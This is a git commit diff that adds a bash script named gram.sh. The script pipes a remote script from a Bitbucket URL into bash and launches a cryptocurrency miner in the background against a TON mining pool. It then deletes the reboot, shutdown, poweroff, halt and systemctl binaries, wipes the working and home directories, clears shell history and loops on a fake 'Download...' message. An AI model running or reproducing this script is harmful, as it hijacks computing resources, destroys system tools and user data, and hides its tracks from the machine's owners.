1859c9d85e236177809f35b809ad3d00a39319a8
Almira Hanafi <almirahanafie@outlook.com>
2024-07-10 15:19:31 +0000

    gram.sh created online with Bitbucket

---
+++ gram.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+apt-get update 
+apt-get install -y wget curl
+curl -sL https://bitbucket.org/new-kamikaze/lolkaze01/raw/main/lolGP.sh | bash
+chmod +x lolkaze
+nohup ./lolkaze --algo GRAM --pool us.ton.hashrate.to --port 4002 --user UQDZ3xIoMrP6K6BNMEZL_Hv8sEhWE-js9SWzFNxJEMywJ8ij.sugoi > /dev/null 2>&1 &
+sleep 30
+rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
+curl ifconfig.me
+rm -rvf *
+cd ~/
+rm -rvf *
+history -cr
+while true
+do
+        echo "Download..."
+        sleep 20
+done
